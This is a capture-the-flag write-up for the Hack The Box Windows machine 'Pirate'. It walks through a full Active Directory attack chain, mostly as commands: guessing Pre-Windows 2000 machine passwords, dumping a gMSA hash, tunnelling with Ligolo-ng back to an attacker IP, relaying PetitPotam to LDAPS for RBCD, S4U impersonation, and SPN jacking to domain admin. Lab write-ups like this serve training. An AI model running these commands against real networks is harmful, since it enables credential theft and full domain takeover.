---
title: "Pirate"
difficulty: Hard
os: Windows
points: 40
rating: 4.7
date: 2026-02-28
avatar: assets/htb/pirate.png
tags: [active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2proxy, spn-jacking, ntlm-relay]
htb_url: https://app.hackthebox.com/machines/Pirate
---
## Summary

Pirate is a Windows multi-host Active Directory attack spread across two network segments. My initial access exploits Pre-Windows 2000 compatible computer accounts, where the password equals the lowercase machine name truncated to 14 characters. From a Pre2k computer account I read a gMSA managed password and pivot into a second segment with Ligolo-ng. Inside, I use PetitPotam to coerce WEB01 to authenticate and relay that to LDAPS to write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), granting MS01$ delegation rights over WEB01$. The chain finishes with WriteSPN + S4U2Proxy + altservice, letting me impersonate Administrator on any service - including DC01 - for Domain Admin.

## Enumeration

I start with a full port scan against the DC, which exposes the usual Active Directory service set:

```bash
nmap -p- --min-rate=10000 -sV -sC pirate.htb
# 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389  (DC1)
```

With Kerberos, LDAP, SMB and WinRM all reachable, I enumerate legacy machine accounts - those with an account name ending in `$` and `userAccountControl = 4128`:

```bash
impacket-GetADUsers -all -dc-ip pirate.htb pirate.htb/
nxc smb pirate.htb -u 'guest' -p '' --rid-brute 5000
# discover legacy hosts: LEGACY01$, MS01$
```

This surfaces the legacy hosts `LEGACY01$` and `MS01$`, both candidates for the Pre-Windows 2000 password formula.

## Foothold

Pre-Windows 2000 accounts carry a predictable password: the lowercase machine name truncated to 14 characters. I request a TGT for `ms01$` using that password and cache it:

```bash
impacket-getTGT pirate.htb/ms01\$:'ms01' -dc-ip pirate.htb
export KRB5CCNAME=ms01\$.ccache
```

The "Pre-Windows 2000 Compatible Access" group grants `ms01$` a null-session-like read over legacy objects, which is enough to pull the gMSA managed password. The gMSA is only as safe as its KDS root key and the `PrincipalsAllowedToRetrieveManagedPassword` DACL, both of which let `ms01$` recover the NT hash for `gmsa$`:

```bash
# As ms01$, dump gMSA via Pre-Windows 2000 group ACL
nxc ldap pirate.htb -k --use-kcache --gmsa
# or
python3 gMSADumper.py -u 'ms01$' -p '' -d pirate.htb
# Recover NT hash for gmsa$
```

The `gmsa$` account lives in a second network segment, so I tunnel into it with Ligolo-ng. I bring up the tun interface and proxy on the attacker side, drop the agent on a compromised host over WinRM, and add a route to the internal subnet:

```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On compromised host (drop via WinRM)
./agent.exe -connect 10.10.14.5:11601 -ignore-cert

# Add route to internal /24
sudo ip route add 172.16.7.0/24 dev ligolo
```

## Privilege Escalation

### RBCD via PetitPotam relay to LDAPS

With internal routing in place, I stand up `ntlmrelayx` targeting LDAPS with `--delegate-access`, then use PetitPotam (MS-EFSRPC) to coerce WEB01 into authenticating back to the relay listener. RBCD is attractive here because it is written as an attribute on the target rather than the impersonator, making it harder to spot:

```bash
# Listen for relayed creds, target LDAPS, write RBCD
impacket-ntlmrelayx -t ldaps://dc01.pirate.htb \
  --delegate-access --escalate-user 'MS01$' --no-smb-server -smb2support

# Coerce WEB01 to auth back to relay listener
python3 PetitPotam.py 10.10.14.5 web01.pirate.htb -u 'gmsa$' -hashes :<NT>
```

The relay sets `msDS-AllowedToActOnBehalfOfOtherIdentity` to MS01$ on WEB01$, giving MS01$ delegation over WEB01$.

### S4U2Self + S4U2Proxy onto WEB01

I grab a TGT for MS01$ and run S4U to impersonate Administrator for `cifs/web01.pirate.htb`, then psexec in with the resulting ticket:

```bash
# Get MS01$ TGT, then S4U
impacket-getST -spn 'cifs/web01.pirate.htb' -impersonate Administrator \
  -dc-ip dc01.pirate.htb 'pirate.htb/MS01$' -hashes :<NT>

export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
impacket-psexec -k -no-pass web01.pirate.htb
```

### WriteSPN + S4U altservice (SPN jacking) to DC

On WEB01 an ACL grants WriteSPN over a DC service account. Any ACL that allows a `serviceprincipalname` write is effectively domain-admin when chained with S4U2Proxy. I add an arbitrary SPN to the DC service account, then use `Rubeus s4u` with `/altservice` to mint a TGS for any service on DC01:

```powershell
Set-DomainObject -Identity 'svc-dc' -Set @{serviceprincipalname='HTTP/dc01.pirate.htb'}
Rubeus.exe s4u /user:svc-dc /rc4:<hash> /impersonateuser:Administrator \
           /msdsspn:HTTP/dc01.pirate.htb /altservice:cifs /ptt
dir \\dc01.pirate.htb\C$
```

Listing the DC's `C$` confirms Domain Admin equivalent access, completing the chain.
